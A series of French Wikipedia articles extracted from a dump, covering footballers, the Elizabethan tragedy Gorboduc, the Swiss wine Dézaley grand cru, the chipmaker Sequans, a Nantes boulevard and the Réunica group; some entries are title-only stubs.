Cet auteur est lauréat de nombreux prix littéraire, dont, notamment :

</doc>
<doc id="6807618" url="https://fr.wikipedia.org/wiki?curid=6807618" title="Egrisi">
Egrisi



</doc>
<doc id="6807620" url="https://fr.wikipedia.org/wiki?curid=6807620" title="Hervé commère">
Hervé commère



</doc>
<doc id="6807621" url="https://fr.wikipedia.org/wiki?curid=6807621" title="Sacrifice (film, 2011)">
Sacrifice (film, 2011)

Sacrifice est un film américain écrit et réalisé par Damian Lee, sorti au cinéma en 2011 puis directement en DVD ou diffusé à la télévision dans la plus grande majorité des autres pays.

</doc>
<doc id="6807633" url="https://fr.wikipedia.org/wiki?curid=6807633" title="Maxime Biset">
Maxime Biset

Maxime Biset est un footballeur belge, né le à Anvers en Belgique. Il évoluait actuellement comme milieu de terrain ou plus particulièrement comme défenseur central.
Il fait actuellement partie du Staff du Royal Antwerp FC.
Carrière professionnelle.
Maxime Biset commence sa carrière au FC Malines. Il découvre la 1 division belge avec ce club lors de la saison 2007-2008.
En 2009, il atteint avec son club formateur la finale de la Coupe de Belgique.
Après 10 années passées au club, il rejoint Royal Antwerp FC.
En 2017, il rejoint le KVC Westerlo.
Carrière d'entraîneur.
Mi juin 2016, Il intègre le Staff du Royal Antwerp FC.

</doc>
<doc id="6807634" url="https://fr.wikipedia.org/wiki?curid=6807634" title="Gorboduc (pièce de théâtre)">
Gorboduc (pièce de théâtre)

Gorboduc est une tragédie appartenant au théâtre élisabéthain, écrite par deux étudiants d'Inner Temple, Thomas Norton et Thomas Sackville. Cette pièce est jouée en à Inner Temple, à l'occasion des fêtes de Noël, et le à Whitehall en présence et à la demande de la reine, Élisabeth.
Cette pièce est considérée comme la première tragédie anglaise grâce à l'introduction de trois nouveautés : 
Argument.
La pièce raconte la fin du règne de Gorboduc, antique roi d'une Grande-Bretagne légendaire. Vieillissant, il veut partager de son vivant son royaume entre ses deux fils, Ferrex et Porrex. Mais ceux-ci se querellent, et le cadet tue l'aîné. La reine, qui préférait l'aîné, tue le cadet pour le venger. Le peuple, ému par ces cruautés, se rebelle contre le roi et la reine et les tue. Les nobles s'unissent et écrasent de façon terrible la rébellion populaire. Mais la mort des princes rend la transmission de la couronne incertaine, et les nobles s'engagent dans une guerre civile, provoquant la mort de beaucoup d'entre eux et de leurs descendants, laissant le pays pour longtemps vide et ruiné. 
Auteurs.
En 1561, le plus âgé des deux auteurs, Norton, a 29 ans. Il est entré à Inner Temple en 1555, et son ouvrage principal est la traduction de "Institution de la religion chrétienne" de Calvin cette même année. Il devient plus tard un homme de loi et un puritain strict. Le second, Sackville, a 25 ans lorsque leur pièce est jouée. Par sa mère, il est cousin de la reine, dont il est proche pendant sa jeunesse. Il fréquente Oxford et Cambridge, et bien qu'il étudie également à Inner temple, il ne semble pas être inscrit à ce Collège de droit. Toutefois en 1561, son père en est le gouverneur. En 1567, il est créé baron Buckhurst et devient une étoile montante au Parlement. La pièce a été éditée par l'historien, érudit littéraire et professeur d'université Joseph Spence.
Analyse.
Le récit s'inspire de l"'Historia regum Britanniae" ("Histoire des rois de Bretagne"), livre II chapitre XVI, de Geoffroy de Monmouth, un évêque et historien anglo-normand qui la rédige entre 1135 et 1138. Gorboduc, ce roi légendaire, aurait vécu au Le choix de cette histoire a pu être suggéré à ses auteurs universitaires par sa ressemblance avec les épisodes sanglants d'Œdipe ou des Atrides, tandis la vengeance, principal moteur de l'ouvrage, révèle l'influence de Sénèque. Le point de départ, l'idée généreuse d'un vieux roi désireux de partager son royaume entre ses descendants qui aboutit à une tragédie, se retrouve dans "Le Roi Lear" de Shakespeare, qui s'était inspiré du même ouvrage de Geoffroy de Monmouth.
En plus de son côté novateur, cette pièce se fait l'écho des préoccupations de la nation anglaise au sujet de l'avenir de la dynastie Tudor. En effet, Élisabeth , dernier enfant vivant d'Henri VIII, montée sur le trône quatre ans plus tôt, et qui approche des trente ans à l'époque de la pièce, n'est pas mariée. Elle décédera d'ailleurs quarante ans plus tard sans descendance, laissant le trône d'Angleterre à la branche écossaise des Stuart. "Gorboduc" est donc une mise en garde contre la faillite du pouvoir. Au moment où s'éveille la conscience nationale, l'absence de descendance fait craindre à moyen terme la division du royaume et la guerre civile. En ce sens, "Gorboduc" affirme que l'État ne doit pas céder devant les factieux, et qu'il ne doit pas hésiter à lever des troupes pour réprimer durement ceux qui voudraient bouleverser l'ordre établi.
Kimball King prétend que Sackville et Norton ont introduit par cette pièce le vers blanc au théâtre, en empruntant cette innovation à Henry Howard, comte de Surrey, poète anglais du début du .

</doc>
<doc id="6807636" url="https://fr.wikipedia.org/wiki?curid=6807636" title="SHA-224">
SHA-224



</doc>
<doc id="6807655" url="https://fr.wikipedia.org/wiki?curid=6807655" title="Coruxo Fútbol Club">
Coruxo Fútbol Club

Le Coruxo Fútbol Club est un club de football espagnol créé en 1930 et basé dans le quartier éponyme faisant partie de la ville de Vigo. Le club évolue actuellement en Segunda Federación.
Histoire.
Le club participe une fois à la Coupe du Roi, lors de la saison 2007-2008, avec un match face au CF Badalona. Badalona remporte le match 4-2 après prolongation.
Le club évolue en "Segunda División B" (troisième niveau) depuis la saison 2010-2011.
Saisons.
"Bilan :"

</doc>
<doc id="6807661" url="https://fr.wikipedia.org/wiki?curid=6807661" title="SHA-384">
SHA-384



</doc>
<doc id="6807669" url="https://fr.wikipedia.org/wiki?curid=6807669" title="SHA-512">
SHA-512



</doc>
<doc id="6807672" url="https://fr.wikipedia.org/wiki?curid=6807672" title="Steven De Petter">
Steven De Petter

Steven De Petter est un footballeur belge, né le à Alost en Belgique. Il évolue comme milieu de terrain.
Biographie.
Carrière de joueur.
KFC Denderleeuw EH.
Steven De Petter commence sa carrière à Denderleeuw.
FCV Dender EH.
En 2006, il rejoint le club de Dender. Il découvre la 1 division belge avec cette équipe lors de la saison 2007-2008. 
KVC Westerlo.
En 2009, il est transféré au KVC Westerlo. 
Steven De Petter dispute 4 matchs en Ligue Europa avec le club de Westerlo lors de la saison 2011-2012.
KV Malines.
En 2012, il signe en faveur du KV Malines.
K Saint-Trond VV.
Le , après une saison blanche marquée par une grave blessure à la cheville lors de la fin de la saison 2018-2019, Steven De Petter met fin à sa carrière de joueur.

</doc>
<doc id="6807673" url="https://fr.wikipedia.org/wiki?curid=6807673" title="École militaire de Saint Cyr">
École militaire de Saint Cyr



</doc>
<doc id="6807674" url="https://fr.wikipedia.org/wiki?curid=6807674" title="Grant Whytock">
Grant Whytock

Grant Whytock est un monteur, assistant de production et producteur américain, né le à Salt Lake City (Utah), mort le à Los Angeles (Californie).
Biographie.
De 1917 à 1970, Grant Whytock est monteur sur environ soixante-dix films américains. Neuf d'entre eux (muets) sont réalisés par Rex Ingram, dont "Les Quatre Cavaliers de l'Apocalypse" (1921, avec Rudolph Valentino et Alice Terry), "Le Prisonnier de Zenda" (1922, avec Lewis Stone et Alice Terry) et "Scaramouche" (1923, avec Ramón Novarro et Alice Terry).
Mentionnons également "Les Passe-partout du diable" d'Erich von Stroheim (1920, avec Sam De Grasse et Mae Busch), "Le Comte de Monte-Cristo" de Rowland V. Lee (1934, avec Robert Donat et Elissa Landi), "Tombouctou" de Jacques Tourneur (1959, avec Victor Mature et Yvonne De Carlo) et "Jack le tueur de géants" de Nathan Juran (1962, avec Kerwin Mathews et Judi Meredith).
Outre cette activité principale de monteur, Grant Whytock est assistant de production sur huit films, sortis de 1940 à 1945, dont "Le Fils de Monte-Cristo" de Rowland V. Lee (1940, avec Louis Hayward et Joan Bennett). Puis il est producteur de onze films, entre 1946 et 1968, y inclus quatre westerns avec Audie Murphy (ex. : "Feu sans sommation" de Sidney Salkow en 1964, dont il assure également le montage). 

</doc>
<doc id="6807675" url="https://fr.wikipedia.org/wiki?curid=6807675" title="SHA-256">
SHA-256



</doc>
<doc id="6807681" url="https://fr.wikipedia.org/wiki?curid=6807681" title="Dézaley grand cru">
Dézaley grand cru

Le Dézaley Grand Cru est un vin de Lavaux, région viticole du canton de Vaud en Suisse, au bord du lac Léman. 
Il est protégé par une appellation d'origine contrôlée, et complété par la mention grand cru.
Histoire.
Ce terroir est cédé par l'évêque de Lausanne en 1141 aux moines cisterciens de Hautcrêt pour sa partie ouest, en 1142 à ceux de Montheron pour sa partie est. Ces terrains, antérieurement incultes, sont défrichés par les moines qui y plantent des vignes. Ils en sont propriétaires jusqu'en 1536.
Étymologie.
Pour l'origine de ce toponyme, plusieurs écoles s'affrontent.
Une première avance que Dézaley proviendrait de "dahsa-legia", ("dahs" = blaireau dans l'ancien haut allemand et "legia" = lieu en bas latin), thèse de Jaccard et Perrenot qui pensent à une forêt peuplée de blaireaux. Hypothèse réfutée par Bossard et Pégorier qui optent pour un toponyme régional suisse dezaley, désignant une terre inculte ou une friche. Ce qui est plus assuré sont les variations à travers les siècles puisqu'on trouve Daisiloi (1137), Dasalay (1154), Daseluy (1184), Desaley (1383) et Désaley (1860).
Une autre interprétation évoque une pente escarpée recouverte de petits conifères et en particulier de sapins, comme le suggère l'étymon reconstruit (base *DASIU "branche de sapin" combinée à la fois avec le suffixe diminutif -ELLU et avec le suffixe collectif -ETU, avec le sens global de "lieu planté de petits sapins").
Situation géographique.
Orographie.
Ce vignoble de la région vaudoise, entre Lausanne et Montreux, fait partie avec le Calamin des deux appellations les plus prestigieuses du canton. Il est accroché sur des terrasses à pente abrupte, façonnées par l'homme, qui descendent jusqu'au lac Léman. Les vignes y reçoivent trois soleils : . Les raisins qui y mûrissent sont plus structurés et plus riches en sucre.
Géologie.
Le terroir viticole de Dézaley a été structuré par les extensions et les reculs du glacier du Rhône au cours du dernier million d’années. Lors du creusement du lac Léman, une intense érosion a raboté ses rives. Après la dernière glaciation du Würm, la moraine glaciaire restée sur place, entre les bancs de poudingue, s'est transformée en un substrat argilo-calcaire qui donne leur typicité aux vins du Dézaley.
Climat.
Le maximum des températures est atteint au cours des mois de juin, juillet et août, les minima en décembre, janvier et février.
Outre les "trois soleils" qui rôtissent le raisin, un micro-climat nocturne influence le vignoble. C'est la bise du Dézaley, un vent froid et sec, qui ralentit la maturation permettant au raisin de développer des arômes complexes.
Vignoble.
Présentation.
Le vignoble est entièrement situé sur la commune de Puidoux.
Encépagement.
Le chasselas y est le cépage roi avec près de 90 % des vignes. Plusieurs cépages de rouge sont plantés en treilles le long des nombreux murs que compte le Dézaley.
Méthodes culturales et réglementaires.
L'obtention de la mention grand cru est liée au terroir ou à la commune dont est issue la vendange. Ce nom doit être mentionné sur l'étiquette. Pour le Dézaley Grand Cru, toutes les vendanges mises en œuvre doivent respecter les teneurs en sucre fixées à l’article 18 du règlement sur les vins vaudois (RVV) du 27 mai 2009 (état au 01.07.2013).
Le Dézaley Grand Cru ne peut être coupé. La mention du millésime est obligatoire. De plus, il est obligatoire que cette récolte provienne à 100 % de ce terroir. 
La densité de plantation oscille entre 9 000 et 12 000 pieds à l'hectare. La majorité des implantations du vignoble sur des terrasses (parchets) ne permet aucune mécanisation des travaux viticoles. Certains plants sont conduits en espaliers (treilles) contre les murs de soutènement. 
Vinification et élevage.
Dans la vinification en blanc la fermentation se déroule en dehors de tout contact avec les parties solides de la vendange (pépins, peaux du raisin, rafles). Le but de cette vinification est de faire ressortir le maximum des arômes contenus d'abord dans le raisin, ensuite en cours de fermentation, enfin lors du vieillissement. 
L'extraction du jus et sa séparation des parties solides peuvent être précédés par un éraflage, un foulage et un égouttage, pour passer ensuite au pressurage. Mais ces phases sont évitées par nombre de vinificateurs pour éviter l'augmentation des bourbes. Le choix se porte sur une extraction progressive du jus puis un débourbage qui permet d'éliminer toute particule en suspension. La maîtrise des températures s'impose lors de la fermentation alcoolique. Elle se déroule entre 18 et 20 °C et dure entre 8 et 30 jours selon le type de vin désiré.
Terroir et vins.
Le vin de ce grand cru est caractérisé par ses notes brûlées, fumées, ainsi que par ses arômes d'amandes, de miel et de caramel où percent des senteurs de fleurs et de fruits. Outre son sol argilo-calcaire, il doit son potentiel aromatique tant à l'inclinaison de son coteau qu'au lac et aux murs de soutènement de ses chailles qui amplifient les effets du soleil. Ce qui permet au chasselas de trouver au Dézaley les conditions optimales pour fournir un grand vin ample, charpenté, généreux et apte au vieillissement.
Structure des exploitations.
Ce terroir viticole de 53,6 hectares est partagé entre 133 propriétaires dont 60 vignerons-encaveurs et négociants.
Type de vins et gastronomie.
Ce vin peut se prendre en apéritif et continuer à être servi avec les hors-d'œuvre. Il se marie traditionnellement avec des viandes blanches dont l'agneau, le veau et singulièrement avec un émincé de veau à la zurichoise, les poissons d'eau douce, les filets ou les terrines de poissons, les fromages, ainsi que les préparations culinaires à base de fromage (raclette et fondue).
Distinctions.
Le vignoble du Dézaley fait partie des vignobles en terrasses classés par l'UNESCO au patrimoine mondial de l'humanité. Ses paysages viticoles sont représentés sur les billets de 200 francs suisses jusqu'au 22 août 2018.

</doc>
<doc id="6807684" url="https://fr.wikipedia.org/wiki?curid=6807684" title="Chi In-jin">
Chi In-jin

Chi In-jin est un boxeur sud-coréen né le à Séoul.
Carrière.
Passé professionnel en 1991, il devient champion de Corée du Sud puis champion d'Asie OPBF des poids coqs en 1994 et 1995. In-jin continue ensuite sa carrière en poids plumes et s'incline face au champion du monde WBC de la catégorie, Erik Morales, le 28 juillet 2001. Il remporte néanmoins ce titre devenu vacant plus tard, le 10 avril 2004, aux dépens de Michael Brodie par KO au lors de leur second affrontement. Il bat ensuite Eiichi Sugama et Tommy Browne avant de perdre aux points contre Takashi Koshimoto le 29 janvier 2006. Chi In-jin remporte une la ceinture WBC le 17 décembre 2006 contre Rodolfo López puis met un terme à sa carrière en juillet 2007 sur un bilan de 31 victoires, 3 défaites et 1 match nul.

</doc>
<doc id="6807695" url="https://fr.wikipedia.org/wiki?curid=6807695" title="Alain Brice">
Alain Brice

Alain Brice (né Alain Bris le à Bordeaux et mort le à Carpentras) est un auteur-compositeur-interprète français.
Il est notamment le compositeur de la chanson "Ma gonzesse" de Renaud. Son plus grand succès en tant qu'interprète est "Et je crois que c'est l'amour" (1979), extrait de son album "Et d'un !".
En 1973 il fait partie de la troupe de l'opéra rock "La Révolution française". Il fit la première partie de Patrick Sébastien à l'Olympia en 1979 (avec Marcel Dadi).
Il meurt accidentellement en 2002.

</doc>
<doc id="6807696" url="https://fr.wikipedia.org/wiki?curid=6807696" title="Henri Giraud (général)">
Henri Giraud (général)



</doc>
<doc id="6807699" url="https://fr.wikipedia.org/wiki?curid=6807699" title="Sequans communications">
Sequans communications

Sequans Communications est une société technologique fournissant des semi-conducteurs pour la téléphonie mobile 4G. Elle développe des puces WiMAX, LTE et bi-mode 4G pour les fabricants d’appareils mobiles à travers le monde. Sequans est la troisième plus grande société de semi-conducteurs « fabless » en Europe.
Deloitte a classé Sequans au de sa liste des Technology Fast 500 de 2011. Le National Microelectronics Institute a nommé conjointement le fondateur de la société Entrepreneur en technologie de l’année en 2011. En 2010, Sequans a reçu le prix « RCR Wireless » "News Ecosystem Award" comme « Best Mobile Chip Company ».
Georges Karam, Ph.D. a co-fondé Sequans Communications en 2003. Sequans est basée à Paris, en France et a des bureaux aux États-Unis, au Royaume-Uni, en Israël, à Singapour, à Taiwan, en Chine, en Corée du Sud et à Hong Kong. Sequans s’échange à la Bourse de New York sous le sigle SQNS.
Histoire.
Georges Karam a co-fondé Sequans Communications en 2003. Il a au préalable occupé des postes de cadre supérieur chez Alcatel-Lucent, Pacific Broadband, SAGEM et Philips. Il a été vice-président de Juniper Networks où il a dirigé les services d’ingénierie câble et de marketing. Georges Karam est également titulaire de plusieurs brevets en communication numérique. Il est maintenant président, PDG et président du Conseil d’administration de Sequans Communications.
Sequans fournissait initialement la technologie de semi-conducteurs 4G WiMAX. Aujourd’hui, Sequans fournit des composants compatibles avec les technologies WiMAX, LTE et bi-mode 4G.
Sequans s’est développée dans l’industrie du LTE en 2009. En 2011, Investors.com rapportait que les puces de Sequans concurrençait les géants de l’industrie LTE. La compagnie a également célébré son introduction à la Bourse de New York le . Il s’agissait de la première société française à être cotée à la Bourse de New York (NYSE) depuis 2002. Son introduction en bourse a recueilli 77 millions de dollars en recettes brutes. Le chiffre d’affaires de Sequans en 2011 s’élevait à 94 millions de dollars. 
En , Sequans a annoncé qu’elle équipait 15 smartphones HTC et tablettes à travers le monde. Ces appareils sont disponibles sur les réseaux de Sprint, Virgin Mobile, et Boost aux États-Unis, Global Mobile et Vee Time à Taiwan, KDDI au Japon et Korea Telecom en Corée.
Toujours en 2012, Sequans en partenariat avec Greenpacket, un fournisseur mondial de réseaux 4G, a lancé la première solution au monde d’appareils à accès intégré bi-mode 4G WiMAX et LTE TDD. La technologie est conçue pour le marché des opérateurs qui passent de la technologie WiMAX au LTE. Sequans a également lancé Sequans AIR, une technologie de rejet d’interférences qui peut rejeter deux fois plus d’interférences que les récepteurs standards. Depuis , Sequans collabore également avec Clearwire dans le but d’affiner son approche du TD-LTE.
La société a fourni des puces à China Mobile pour son réseau de démonstration TD-LTE et des puces commerciales TD-LTE pour les réseaux de SKY Brasil, National Broadband Network en Australie. Les fabricants qui ont adopté les puces LTE de Sequans pour leurs appareils LTE sont notamment Ubee Interactive, Telenet Systems, Gemtek, Netcomm, Seowon Intech, Modacom.
Aujourd’hui, Sequans est la troisième plus grande société de semi-conducteurs «fabless» en Europe. Elle crée activement de nouveaux partenariats LTE TDD dans le but de créer une nouvelle croissance et de la rentabilité. En 2011, le MIIT (Ministère de l'Industrie et de la Technologie) de la Chine a approuvé la première génération de puces de Sequans pour être utilisée dans la phase numéro 1 d’essai à grande échelle de China Mobile. Le MIIT a approuvé la deuxième génération de technologie de Sequans pour la phase d’essai numéro 2 en 2012. Sequans cible les technologies LTE FDD et TDD comme étant des possibilités de marché alors que le marché LTE est en pleine croissance.
Produits.
Sequans développe les technologies de semi-conducteurs pour les réseaux de téléphonie mobile 4G. La société a lancé cinq générations de technologies 4G depuis ses neuf années d’existence. Ses produits supportent les deux types de protocoles à haut débit sans fil WiMAX et LTE.
Les solutions WiMAX de Sequans sont disponibles dans plus de 15 smartphones et tablettes à travers le monde, y compris les appareils HTC Evo. Ses puces WiMAX sont conformes aux standards IEEE de WiMAX fixe (802.16d) et WiMAX mobile (802.16e). La technologie Sequans équipe également des appareils électroniques tels que les dongles USB et des routeurs mobiles.
Sequans a commencé à développer des produits LTE en 2009. Sa deuxième génération de puces LTE a été récemment approuvée par le Ministère de l’Industrie et de la Technologie de la Chine. En 2012, Sequans et China Mobile vont continuer avec la deuxième phase d’essai à grande échelle de LTE. Sequans continuera de déployer ses solutions de semi-conducteurs LTE au niveau mondial alors que les réseaux existants de 2G et 3G vont passer à la technologie 4G.

</doc>
<doc id="6807703" url="https://fr.wikipedia.org/wiki?curid=6807703" title="Victor Martin Le Roy">
Victor Martin Le Roy

Victor Martin Le Roy est un magistrat à la Cour des comptes, mécène et collectionneur d'art né le à Paris et mort le à Paris. Il fut l'un des fondateurs et dirigeants de la Société des Amis du Louvre.
Biographie.
Fils de Jean-Victor Martin-Le Roy (1807-1872), président de la Chambre des agréés auprès du Tribunal de commerce de la Seine et cofondateur de la Société civile des Nu-Propriétaires, il épouse Marie Lebaudy (1852-1929), fille du magnat du sucre Gustave Lebaudy. Il est le beau-père de Jean-Jacques Marquet de Vasselotqui épousa sa fille Jeanne. 
Licencié en droit, il est reçu en tant qu'avocat. Quatrième au concours de 1869, il rentre comme auditeur à la Cour des comptes en 1870, avant de passer conseiller référendaire de 1 classe en 1901. Des problèmes de santé le conduise à prendre sa retraite en 1906 comme conseiller honoraire.
Par ailleurs archéologue, il collectionne de nombreuses pièces Haute époque dont une partie sont données au musée du Louvre à sa mort en 1914. En 2012 un Livre d'heures de Jeanne de France ayant appartenu à la collection de Victor Martin Le Roy est acquis par la BnF. C’est la première fois que l’État recourt à la possibilité récemment ouverte aux maisons de ventes de réaliser des ventes de gré à gré. Cette faculté est prévue par la loi du . Un portrait d"'Anton Fugger" par Hans Maler acheté par Martin Le Roy à Venise est également au Louvre. Au fil des ans, le Musée de Cluny a également acquis plusieurs pièces provenant de la collection Martin-Le Roy .
La collection d'œuvres d'Art de Victor Martin Le Roy constitue un témoignage sur les arts du Moyen Âge. Une grande partie de la collection formée par Martin Le Roy a été étudiée par son gendre, Jean-Joseph Marquet de Vasselot, historien d’Art, ancien conservateur au musée du Louvre et directeur du musée de Cluny. Ce dernier a dirigé la publication en 1906-1909, d'un catalogue complet de la collection de son beau-père, en cinq volumes.
Cofondateur de la Société des Amis du Louvre, dont il devient le vice-président, il est membre du conseil d’administration de la Société de l'Union centrale des arts décoratifs, des commissions supérieures des Beaux-Arts aux Expositions universelles de 1889 et 1900, de la Société de l'histoire de Paris et de l'Île-de-France, de l'Union artistique et du Cercle athlétique de l'Île de Puteaux.
Il était propriétaire du pavillon de Moisson à La Roche-Guyon.

</doc>
<doc id="6807706" url="https://fr.wikipedia.org/wiki?curid=6807706" title="Félix Van Merris">
Félix Van Merris

Félix Eugène Marie Corneille Van Merris, né le à Poperinge et décédé le à Lisieux est homme politique belge flamand, membre du parti catholique.
Il fut candidat en philosophie et lettres (KUL, 1879) et en sciences politiques et administratives (1880). Il fut élu conseiller communale à Poperinge, puis échevin (1888) et bourgmestre (1904); conseiller provincial de la province de Flandre-Occidentale (1892-1896) et député de l'arrondissement d'Ypres (1896-1918).

</doc>
<doc id="6807708" url="https://fr.wikipedia.org/wiki?curid=6807708" title="Coruxo Football Club">
Coruxo Football Club



</doc>
<doc id="6807714" url="https://fr.wikipedia.org/wiki?curid=6807714" title="Boulevard Victor-Hugo (Nantes)">
Boulevard Victor-Hugo (Nantes)

Le boulevard Victor-Hugo est une rue de Nantes, sur l'île de Nantes, en France.
Situation et accès.
Cette artère rectiligne, elle relie la place de la République à la place Victor-Mangin, deux des places les plus importantes de l'île. Avec de longueur c'est l'une des voies publiques les plus longues de la ville. Elle rencontre sur son tracé les rues Alexandre-Fourny, de l'Échappée, des Récollets, l'avenue Bourgault-Ducoudray, les boulevards Benoni-Goullin et Adolphe-Billault, ainsi que la rue Maurice-Daniel.
Origine du nom.
Par délibération du conseil municipal du 26 janvier 1885, l'artère est dénommée « avenue Victor-Hugo », en l'honneur du grand homme de lettres, qui décédera quatre mois plus tard, et dont la mère, Sophie Trébuchet, était nantaise.
Historique.
Il fut créé vers le début des années 1880, en vue de l'urbanisation de la partie centrale des îles de la Loire. Avant le comblement de la boire de Toussaint et de celle des Récollets, entre 1900 et 1945, des ponts permettaient au boulevard de traverser ces bras du fleuve.
Au niveau de l'actuel croisement avec le boulevard Benoni-Goullin et du pont ferroviaire qui traverse le boulevard, se trouvait la gare de Legé, point de départ de la ligne de chemin de fer métrique allant de Nantes à Legé.
Depuis 1960, la Ligne ferroviaire Nantes - Saint-Gilles-Croix-de-Vie traverse le boulevard par l'intermédiaire d'un pont situé au niveau du square Vertais et qui franchit également le boulevard des Martyrs-Nantais-de-la-Résistance tout proche. Cet aménagement, dont les travaux durèrent deux ans, fut nécessaire afin de supprimer le passage à niveau dans l'ancien tracé qui empruntait les boulevards Vincent-Gâche et Babin-Chevaye, et qui constituait un sérieux inconvénient pour la circulation automobile entre les deux rives de la Loire.
Voies liées.
Avenue Bourgault-Ducoudray.
Cette impasse de presque débouche sur le côté ouest du boulevard. Elle rend hommage au compositeur et chef d'orchestre Louis-Albert Bourgault-Ducoudray.
Rue Maurice-Daniel.
Cette artère part du boulevard Victor-Hugo pour aboutir rue René-Mouchotte et croise la rue René-Peigné à la moitié de son tracé.
Elle a reçu sa dénomination après délibération du conseil municipal du 10 août 1945 et rend hommage à Maurice Daniel né en 1897, conseiller général et ingénieur des services techniques de la ville de Nantes, qui participa à la création de la Fédération des amicales laïques. Grande figure locale de la résistance, il fut fusillé au Mont-Valérien par les Allemands le 27 novembre 1942.
Une nouvelle délibération du conseil municipal du 28 décembre 1950, lui permet d'intégrer la partie ouest de l'ancienne « rue Petit-Pierre » qui reliait autrefois la rue de Vertais à l'actuelle rue René-Peigné (intégrée alors à la rue de la Prairie-d'Aval). Elle portait le nom de la famille Petitpierre, dont l'un des membres Ferdinand (1746-1803), à la fois oncle et beau-frère de Ferdinand Favre, maire de Nantes, possédait en effet une manufacture dans cette ruelle, qui est transformée en rue pavée en l'an V, puis est alignée en 1806 pour faciliter l'accès au bâtiment industriel. Elle est appelée « rue Lecat » puis « rue du Cherche-Midi ». C'est en 1830 qu'elle est baptisée « rue Petit-Pierre ». Séparée en deux tronçons par le percement du boulevard Victor-Hugo au début des années 1880, sa partie est, située légèrement au sud de l'actuel boulevard Adolphe-Billault) a totalement disparu lors de l'aménagement réalisé après la Seconde Guerre mondiale.

</doc>
<doc id="6807717" url="https://fr.wikipedia.org/wiki?curid=6807717" title="Groupe Réunica">
Groupe Réunica

Réunica est un groupe paritaire de protection sociale à but non lucratif. Ses activités s’articulent autour des métiers de la prévoyance, de la mutuelle santé, de l’épargne, de la retraite complémentaire et de l’action sociale, notamment sur la prévention santé et sur les problématiques liées au vieillissement auprès des retraités, salariés et entreprises. Réunica est désigné dans le cadre d’un accord de branche pour gérer la retraite complémentaire et la prévoyance du travail temporaire.
Historique.
Une construction progressive au rythme des évolutions sociales en France.
Les institutions de retraite complémentaire et de prévoyance santé ont vu le jour en suivant les évolutions de la société française et de ses réformes sociales. Certaines de ces institutions sont les fondements du Groupe Réunica.
La retraite par répartition, toujours en vigueur, est apparue en 1947 et avec elle, les institutions cadres (AGIRC) sont créées : CRICA, CIRCA et CRICIC. En 1953, le patronat et les syndicats sont paritairement cogestionnaires de la Sécurité sociale. Les institutions non cadres (ARRCO) sont mises en place : ANEP, IREPS, IRNIS. Un premier pas dans la collaboration entre les institutions de retraite et le travail temporaire est effectué en 1968 quand Manpower et BIS font appel à l’IREPS pour leurs salariés. Les garanties de prévoyance en travail temporaire lui seront également confiées en 1983.
En 1973, la retraite complémentaire et l’assurance vieillesse sont rendues obligatoires. En deux ans, les institutions de retraite se multiplient et en quatre ans, la retraite complémentaire pour tous (cadres et non cadres) est en place.
Le temps des concentrations.
En 1991, Michel Rocard, alors Premier Ministre, initie le premier « Livre Blanc sur les retraites » faisant un diagnostic du système de retraites et analysant les perspectives d’évolutions. Avec ce Livre Blanc, Michel Rocard initie la concentration des institutions de retraite et de prévoyance.
Dès 1992, ces institutions se structurent pour former les groupes de protection sociale. C’est alors qu'ANEP, CRICA, CRICA Prévoyance et IRNIS se concentrent, donnant naissance à Retraites Unies. 
De son côté, l’Association de Prévoyance Bayard (CIRCACIC, GIRS, IREPS, IREPS Prévoyance), créée en 1981, devient Bayard Retraite Prévoyance en 1999.
En 2002, Retraites Unies (hors CRICA Prévoyance) devient Réunica et CRICA Prévoyance devient Réunica Prévoyance. La Fondation Réunica Prévoyance est également créée à la même époque.
Le phénomène de concentration initié en 1992 se poursuit puisqu’en 2006, Réunica et Bayard Retraite Prévoyance se rapprochent et créent un nouveau groupe de protection sociale. Au sein de ce nouvel ensemble, les institutions de retraite ANEP et IRNIS fusionnent pour devenir ANEP. C’est à cette période (2005) que le GIE (Groupement d’intérêt économique) Informatique Systalians est créé pour répondre aux besoins des systèmes d’information de la protection sociale.
En 2008, le groupe de protection sociale Réunica-Bayard prend le nom de Réunica. Au sein du groupe Réunica, les institutions de retraite cadres (AGIRC), CRICA et CIRCACIC ne forment plus qu’une seule institution : Réuni Retraite Cadres. L’ANEP et l’IREPS fusionnent également pour devenir Réuni Retraite Salariés.
C’est en 2010 que le groupe Arpege et Réunica se rapprochent. Réunica est ainsi composé de deux institutions de retraite complémentaire (Réuni Retraite Cadres et Réuni Retraite Salariés), deux institutions de prévoyance (Réunica Prévoyance et Arpege Prévoyance) et de deux mutuelles interprofessionnelles (Réunica Mutuelle et Muta Santé), en sus de son GIE Informatique Systalians et de la Fondation Réunica Prévoyance.
Début 2012, le Groupe Ag2r-La Mondiale confie l’exploitation de son système d’information Retraite complémentaire à Systalians, le GIE Informatique du Groupe Réunica. Systalians assure désormais l’exploitation informatique de près de 25 % de la retraite complémentaire en France servant plus de , de salariés et près de de retraités.
Pour poursuivre sa croissance externe, Réunica a initié un nouveau projet de rapprochement ; dans cette perspective, le groupe a lancé une consultation en , auprès de de protection sociale (Ag2r-La Mondiale, Apicil, Malakoff-Médéric). L’Association Sommitale de Réunica réunie en conseil le , a retenu AG2R LA MONDIALE. Quatre critères principaux ont motivé cette décision : les ressources humaines, les systèmes d’information, le développement de l’assurance de personnes et la solidité financière.
Réunica devient AG2R LA MONDIALE.
2014 :
Adoption à l’unanimité par les Assemblées générales d’AG2R LA MONDIALE et RÉUNICA du principe de rapprochement
Adoption à l’unanimité par l’Assemblée générale de VIASANTÉ du principe de rapprochement avec AG2R LA MONDIALE
Fusion de 8 mutuelles du groupe AG2R LA MONDIALE au sein de VIASANTÉ
 : naissance du nouvel ensemble
 : Le Conseil d’Administration de la nouvelle Association Sommitale AG2R LA MONDIALE REUNICA s’est réuni et a procédé à la désignation de sa Présidence Paritaire et de sa Direction Générale.
À compter du , M. Jean-Claude Barboul (collège salariés - CFDT) devient Président de l’Association Sommitale. M. Jacques Rigolot (collège employeur - MEDEF) accède à la Vice-Présidence.
La nouvelle Association Sommitale ainsi constituée a ensuite procédé à la nomination de M. André Renaudin en qualité de Directeur Général. À ses côtés, M. Jean-Marc Robinet assurera les fonctions de Directeur Général-Adjoint.  
Le nouveau groupe compte désormais 11 000 collaborateurs répartis sur l’ensemble du territoire (285 sites) et occupe, des positions de premier plan en retraite et en assurance de la personne :
Le groupe assure également 84 branches professionnelles.
Fondation Réunica Prévoyance.
En 2002, Réunica crée la Fondation Réunica Prévoyance, sous l’égide de la Fondation de France. L’objectif de la Fondation Réunica Prévoyance est d’apporter du mieux-être aux personnes handicapées ou touchées par la maladie grâce à l’art et à la culture. Elle soutient des projets dans le domaine de la danse, la musique, le théâtre ou la peinture.
